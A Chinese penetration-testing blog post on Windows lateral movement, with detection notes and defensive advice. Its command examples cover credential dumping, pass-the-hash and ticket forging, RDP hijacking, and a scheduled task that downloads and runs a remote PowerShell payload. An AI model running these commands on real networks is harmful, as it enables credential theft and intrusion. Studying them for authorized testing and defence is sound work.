---
title: 横向移动技术汇总
date: 2025-08-05 08:00:00
tags:
  - 内网渗透
  - 渗透测试
description: 后渗透横向移动——PsExec/WMIExec/SMBExec 对比、WinRM 与 RDP 会话劫持。
categories: 渗透测试
---

## 概述

横向移动（Lateral Movement）是内网渗透的核心环节。攻击者获得初始立足点后，需横向移动以扩大控制范围、获取更高权限或接近最终目标。本文系统梳理主流横向移动技术，涵盖Windows远程执行方法、凭证重用攻击、Token窃取与工具使用。

---

## 一、Windows远程执行技术

### 1.1 WMI (Windows Management Instrumentation)

WMI通过DCOM协议（135端口 + 动态RPC端口范围）进行远程管理通信。前提是需要目标管理员凭据且RPC服务开启。

```bash
# wmic远程执行命令
wmic /node:192.168.1.50 /user:administrator /password:P@ssw0rd process call create "cmd.exe /c whoami > C:\tmp\result.txt"
```

```powershell
# PowerShell通过WMI创建远程进程
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "calc.exe" -ComputerName 192.168.1.50 -Credential $cred
# 远程侦察信息收集
Get-WmiObject -Class Win32_OperatingSystem -ComputerName 192.168.1.50 -Credential $cred
```

**检测要点**：监控`Microsoft-Windows-WMI-Activity/Operational`日志（Event ID 5857, 5860, 5861），关注`svchost.exe` → `WinMgmt.exe`的异常子进程创建。

### 1.2 PsExec

PsExec通过SMB（445端口）将`PSEXESVC.exe`上传到`ADMIN$`共享（`C:\Windows`），再通过服务控制管理器注册并启动临时服务，以`SYSTEM`权限执行命令，完毕自动清理服务注册表项。

```bash
# 远程执行并获得交互式Shell
PsExec.exe \\192.168.1.50 -u administrator -p P@ssw0rd cmd.exe
# 以SYSTEM权限执行
PsExec.exe \\192.168.1.50 -s cmd.exe
# 批量执行（配合targets.txt目标列表）
PsExec.exe @targets.txt -u administrator -p P@ssw0rd ipconfig
```

**检测特征**：Event ID 7045（服务创建，服务名含`PSEXESVC`）；SMB `ADMIN$`共享的异常文件写入；登录类型3与4672特权分配事件的关联。

### 1.3 计划任务 (Scheduled Tasks)

通过`schtasks`在远程主机创建计划任务执行命令，基于RPC/SMB协议。优势是不需要在目标上传二进制文件，部分安全产品对其检测较弱。

```bash
# 创建远程计划任务
schtasks /create /s 192.168.1.50 /u administrator /p P@ssw0rd /tn "UpdateTask" \
    /tr "powershell.exe -c IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.100/payload.ps1')" \
    /sc once /st 00:00
# 立即执行
schtasks /run /s 192.168.1.50 /u administrator /p P@ssw0rd /tn "UpdateTask"
# 清理痕迹
schtasks /delete /s 192.168.1.50 /u administrator /p P@ssw0rd /tn "UpdateTask" /f
```

**检测**：`Microsoft-Windows-TaskScheduler/Operational`日志（Event ID 106, 140, 141），非工作时间的`schtasks.exe`调用，SYSTEM权限运行且含可疑命令行的计划任务。

### 1.4 WinRM & PowerShell Remoting

WinRM基于HTTP(S)（5985/5986端口），是PowerShell Remoting的底层协议。相比DCOM方式，穿越防火墙能力更强。

```bash
# 目标启用WinRM
winrm quickconfig
```

```powershell
# 交互式远程会话
Enter-PSSession -ComputerName 192.168.1.50 -Credential $cred
# 一对多并行执行
Invoke-Command -ComputerName 192.168.1.50, 192.168.1.51 -ScriptBlock { whoami } -Credential $cred
# 创建持久会话供复用
$session = New-PSSession -ComputerName 192.168.1.50 -Credential $cred
Invoke-Command -Session $session -ScriptBlock { Get-Process lsass }
```

**多跳问题**：从A→B→C时，B无法将凭证传递到C（Second Hop Problem）。解决方案是启用CredSSP认证：

```powershell
Enable-WSManCredSSP -Role Client -DelegateComputer "*.domain.com"    # 中间主机
Enable-WSManCredSSP -Role Server                                     # 目标主机
New-PSSession -ComputerName 192.168.1.50 -Credential $cred -Authentication CredSSP
```

**检测**：`Microsoft-Windows-PowerShell/Operational`日志（Event ID 4104脚本块、4103管道执行、53504 Session创建）；`Microsoft-Windows-WinRM/Operational`日志。

### 1.5 DCOM (Distributed Component Object Model)

DCOM允许在远程主机上实例化COM对象并调用其方法，基于RPC（135 + 动态端口）。可利用的COM对象包括`MMC20.Application`、`ShellWindows`、`ShellBrowserWindow`、`Excel.Application`。

```powershell
# MMC20.Application — 远程进程创建
[System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "192.168.1.50")) \
    .Document.ActiveView.ExecuteShellCommand("cmd.exe", $null, "/c calc.exe", "7")

# ShellWindows — 适用于Win7/Win2008R2等早期版本
$com = [Type]::GetTypeFromCLSID('9BA05972-F6A8-11CF-A442-00A0C90A8F39', "192.168.1.50")
$obj = [System.Activator]::CreateInstance($com)
$obj.Item().Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "C:\Windows\System32", $null, 0)

# ShellBrowserWindow — Win10/Win2016+适用
$com = [Type]::GetTypeFromCLSID('c08afd90-f2a1-11d1-8455-00a0c91f3880', "192.168.1.50")
$obj = [System.Activator]::CreateInstance($com)
$obj.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "C:\Windows\System32", $null, 0)
```

**检测**：`Microsoft-Windows-DistributedCOM`日志（Event ID 10016, 10028）；非用户目录下Office进程的启动；`svchost.exe` → `DcomLaunch`下的异常子进程。

---

## 二、凭证重用攻击

### 2.1 Pass-the-Hash (PtH)

Windows NTLM认证仅需哈希即可完成网络身份验证。获取LSASS内存中的NTLM哈希后，无需破解明文即可访问远程网络资源。

> **限制**：Win8.1 / Server 2012 R2+引入受限管理员模式（Remote UAC），本地管理员（非RID 500）的网络令牌被剥离管理员权限。域账户或RID 500不受影响，或可设置`LocalAccountTokenFilterPolicy = 1`绕过。

```bash
# Mimikatz — 从内存提取哈希
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
# Mimikatz — PtH执行（弹出新cmd窗口，在该窗口内具备目标身份）
mimikatz.exe "privilege::debug" "sekurlsa::pth /user:administrator /domain:corp.local /ntlm:<NTLM-HASH>" "exit"
```

**Impacket工具集中的PtH**：

```bash
wmiexec.py -hashes :<NTLM-HASH> administrator@192.168.1.50        # WMI半交互Shell
psexec.py -hashes :<NTLM-HASH> administrator@192.168.1.50         # SMB半交互Shell
smbexec.py -hashes :<NTLM-HASH> administrator@192.168.1.50        # 较隐蔽的执行方式
atexec.py -hashes :<NTLM-HASH> administrator@192.168.1.50 "whoami" # 计划任务执行单命令
```

### 2.2 Pass-the-Ticket (PtT)

从LSASS内存提取Kerberos票据（TGT/TGS），导入到当前会话以伪装成目标用户访问Kerberos认证服务。

```bash
# Mimikatz — 导出并注入票据
mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" "exit"
mimikatz.exe "privilege::debug" "kerberos::ptt <ticket.kirbi>" "exit"
klist  # 验证票据已注入
dir \\DC01.corp.local\c$   # 测试域内资源访问
```

```bash
# Rubeus — 从内存提取TGT
Rubeus.exe tgtdeleg
# Rubeus — 通过RC4哈希请求新TGT并注入
Rubeus.exe asktgt /user:administrator /rc4:<NTLM-HASH> /ptt
```

**Golden Ticket & Silver Ticket**：

```bash
# Golden Ticket — 使用krbtgt哈希伪造TGT（冒充任意域用户）
mimikatz.exe "lsadump::dcsync /domain:corp.local /user:krbtgt" "exit"  # 获取krbtgt哈希
mimikatz.exe "kerberos::golden /domain:corp.local /sid:S-1-5-21-xxxxx /rc4:<KRBTGT-HASH> /user:Administrator /ptt" "exit"

# Silver Ticket — 使用服务账户哈希伪造TGS（针对特定服务，更隐蔽）
mimikatz.exe "kerberos::golden /domain:corp.local /sid:S-1-5-21-xxxxx /target:dc01.corp.local /service:cifs /rc4:<MACHINE-ACCOUNT-HASH> /user:Administrator /ptt" "exit"
```

**检测**：Event ID 4769（异常加密类型）、4768（异常TGT请求）；Golden Ticket默认10年有效期特征；短时大量票据请求。

### 2.3 Overpass-the-Hash (Pass-the-Key)

使用用户NTLM哈希"升级"为Kerberos TGT票据，适用于：获取哈希但无法破解明文；环境启用NTLM限制；需访问依赖Kerberos的服务。

```bash
# Mimikatz — 使用NTLM哈希请求TGT
mimikatz.exe "privilege::debug" "sekurlsa::pth /user:administrator /domain:corp.local /ntlm:<NTLM-HASH> /run:cmd.exe" "exit"

# Mimikatz — 使用AES256 Key请求TGT
mimikatz.exe "privilege::debug" "sekurlsa::pth /user:administrator /domain:corp.local /aes256:<AES256-KEY> /run:cmd.exe" "exit"
```

```bash
# Rubeus — Over-PtH（通过RC4 / AES256哈希请求TGT）
Rubeus.exe asktgt /user:administrator /rc4:<NTLM-HASH> /domain:corp.local /ptt
Rubeus.exe asktgt /user:administrator /aes256:<AES256-KEY> /domain:corp.local /ptt
```

---

## 三、Token窃取与会话劫持

### 3.1 Access Token窃取

Windows每个登录用户的进程关联一个Access Token（含SID、组成员关系、权限）。攻击者通过枚举系统令牌，复制高权限令牌并启动新进程以窃取身份。

```bash
# Metasploit — incognito模块
meterpreter > use incognito
meterpreter > list_tokens -u                  # 列出可用用户令牌
meterpreter > impersonate_token CORP\\Administrator
meterpreter > getuid                           # 返回: CORP\Administrator
meterpreter > rev2self                         # 恢复原始令牌
```

```
# Cobalt Strike
beacon> steal_token <PID>
beacon> rev2self
```

### 3.2 RDP Session Hijacking（RDP会话劫持）

管理员直接关闭RDP客户端（未注销）时，其会话保持已认证状态。攻击者获取SYSTEM权限后可劫持该会话，无需密码接管管理员桌面。

```bash
# 步骤1：查询在线会话
query user
# 输出: administrator  ID:1  STATE:Disc     (已断开但未注销)

# 步骤2：以SYSTEM权限劫持会话
PsExec.exe -s \\localhost cmd.exe
tscon 1 /dest:console                     # 劫持Session ID 1到当前控制台

# 或通过Mimikatz
mimikatz.exe "privilege::debug" "ts::sessions" "ts::remote /id:1" "exit"
```

> **注意**：Win10 1903 / Server 2019+增加了`tscon`劫持限制（活跃用户会话时无法劫持）。防御：管理员应养成注销习惯，启用RDP会话超时策略。

---

## 四、工具指南

### 4.1 CrackMapExec (NetExec)

内网渗透瑞士军刀，整合SMB、WinRM、MSSQL、SSH协议的自动化利用。

```bash
# SMB扫描与认证
crackmapexec smb 192.168.1.0/24 -u administrator -p P@ssw0rd
crackmapexec smb 192.168.1.0/24 -u administrator -H <NTLM-HASH>   # Pass-the-Hash
crackmapexec smb 192.168.1.0/24 -u users.txt -p Spring2025! --continue-on-success

# 横向移动（命令执行）
crackmapexec smb 192.168.1.50 -u administrator -p P@ssw0rd -x "whoami"
crackmapexec smb 192.168.1.50 -u administrator -p P@ssw0rd -X "Get-Process lsass"  # PowerShell编码
crackmapexec winrm 192.168.1.50 -u administrator -p P@ssw0rd -x "whoami"

# 凭据导出模块
crackmapexec smb 192.168.1.50 -u administrator -p P@ssw0rd --sam          # SAM哈希
crackmapexec smb 192.168.1.50 -u administrator -p P@ssw0rd --lsa          # LSA Secrets
crackmapexec smb 192.168.1.50 -u administrator -p P@ssw0rd -M lsassy      # LSASS内存凭据
crackmapexec smb 192.168.1.50 -u administrator -p P@ssw0rd -M mimikatz    # Mimikatz模块
```

### 4.2 Impacket

Impacket是Python库，提供Windows网络协议的低级编程接口。横向移动核心脚本如下：

| 脚本 | 协议/端口 | 执行机制 | 交互性 | 检测难度 |
|------|-----------|----------|--------|----------|
| `wmiexec.py` | DCOM (135+RPC) | WMI进程创建 | 半交互 | 中低 |
| `psexec.py` | SMB (445) | 上传服务二进制 | 半交互 | 中 |
| `smbexec.py` | SMB (445) | 服务管道重定向 | 半交互 | 低（隐蔽） |
| `atexec.py` | RPC (135+445) | 计划任务 | 单命令 | 低 |
| `dcomexec.py` | DCOM (135+RPC) | DCOM对象调用 | 半交互 | 中 |
| `secretsdump.py` | DRSUAPI/SMB | 远程凭据导出 | 无 | 高 |

```bash
# 横向移动
wmiexec.py -hashes :<NTLM-HASH> administrator@192.168.1.50
smbexec.py -hashes :<NTLM-HASH> administrator@192.168.1.50
atexec.py -hashes :<NTLM-HASH> administrator@192.168.1.50 "whoami"

# 凭据导出
secretsdump.py -hashes :<NTLM-HASH> administrator@192.168.1.50    # 远程SAM/LSA/NTDS
secretsdump.py -just-dc-user administrator corp.local/admin:P@ssw0rd@192.168.1.10  # DCSync

# Kerberos票据操作
getTGT.py corp.local/administrator -hashes :<NTLM-HASH> -dc-ip 192.168.1.10
export KRB5CCNAME=administrator.ccache
wmiexec.py -k -no-pass administrator@dc01.corp.local -dc-ip 192.168.1.10  # 使用票据
ticketer.py -nthash <KRBTGT-HASH> -domain-sid S-1-5-21-xxxxx -domain corp.local administrator  # Golden Ticket
```

---

## 五、综合技术对比

### 5.1 远程执行技术对比

| 技术 | 端口 | 协议 | 上传文件 | 交互性 | 权限 | 检测可能性 |
|------|------|------|----------|--------|------|------------|
| WMI | 135+动态RPC | DCOM | 否 | 半交互 | 调用者 | 中 |
| PsExec | 445 | SMB | 是 | 交互 | SYSTEM | **高** |
| 计划任务 | 135/445 | RPC/SMB | 否 | 单命令 | 调用者 | 中低 |
| WinRM/PS Remoting | 5985/5986 | HTTP(S) | 否 | 交互 | 调用者 | 中高 |
| DCOM对象 | 135+动态RPC | DCOM | 否 | 单命令 | 取决于COM对象 | 中 |
| RDP劫持 | 3389 | RDP | 否 | 交互 | 被劫持用户 | 低 |

### 5.2 凭证攻击技术对比

| 技术 | 所需凭据 | 适用协议 | 需管理权限 | 主要防护 | 检测可能性 |
|------|----------|----------|------------|----------|------------|
| Pass-the-Hash | NTLM Hash | NTLM | 目标管理员 | Credential Guard, NTLM禁用 | **高** |
| Pass-the-Ticket | Kerberos Ticket | Kerberos | 否(SeTcb) | AES加密, PAC验证 | 中 |
| Overpass-the-Hash | NTLM Hash→TGT | Kerberos | 否 | RC4禁用(AES Only) | 中 |
| Golden Ticket | KRBTGT Hash | Kerberos | 域管/DCSync | PAC验证, 票据生命周期 | 中高 |
| Silver Ticket | 服务账户Hash | Kerberos | 服务账户哈希 | PAC验证 | 中低 |
| Token窃取 | SYSTEM/管理员 | N/A | 是 | 最小权限原则 | 低-中 |

### 5.3 工具能力矩阵

| 工具 | WinRM | WMI | PsExec | 计划任务 | PtH | 凭据Dump | 密码喷洒 |
|------|-------|-----|--------|----------|-----|----------|----------|
| CrackMapExec | ✅ | ✅ | ❌ | ✅ | ✅ | ✅ | ✅ |
| Impacket | ❌ | ✅ | ✅ | ✅ | ✅ | ✅ | ❌ |
| Mimikatz | ❌ | ❌ | ❌ | ❌ | ✅ | ✅ | ❌ |
| Metasploit | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ |

---

## 六、防御建议

1. **网络分段**：关键服务器（域控、数据库）置于独立VLAN，限制工作站到服务器的非必要端口（135, 139, 445, 3389, 5985, 5986）
2. **最小权限**：严格限制管理员组成员，禁止在日常工作站使用域管账户登录，实施Tiered Access Model（Tier 0/1/2）
3. **LAPS**：部署Microsoft LAPS确保每台主机本地管理员密码唯一且定期轮换
4. **Credential Guard**：Win10/11 Enterprise及Server 2016+启用，将LSASS凭据存储在虚拟化安全隔离环境中
5. **Windows防火墙**：非管理网段禁用入站SMB、NetBIOS、WinRM、RDP端口
6. **关键日志监控**：
   - 安全日志：Event ID 4624（登录）、4625（登录失败）、4672（特权分配）、4768-4769（Kerberos）、4776（NTLM）
   - PowerShell日志：Event ID 4104（脚本块）
   - WMI日志：Event ID 5857-5861
   - Sysmon：Event ID 1（进程创建）、3（网络连接）、10（进程访问）、11（文件创建）
7. **RDP安全**：设置会话超时自动注销，启用NLA，限制RDP登录用户组
8. **定期审计**：审计服务账户的委派配置，检查KRBTGT密码轮换周期（建议≤180天）

---

## 免责声明

本文所述技术仅供安全研究与授权的渗透测试使用。未经系统所有者明确书面授权，在任何计算机系统或网络上使用本文所述技术均属违法行为。作者及发布平台不对任何误用或非法使用本文内容造成的后果承担法律责任。读者应遵守当地法律法规，仅在合法授权范围内进行安全测试。
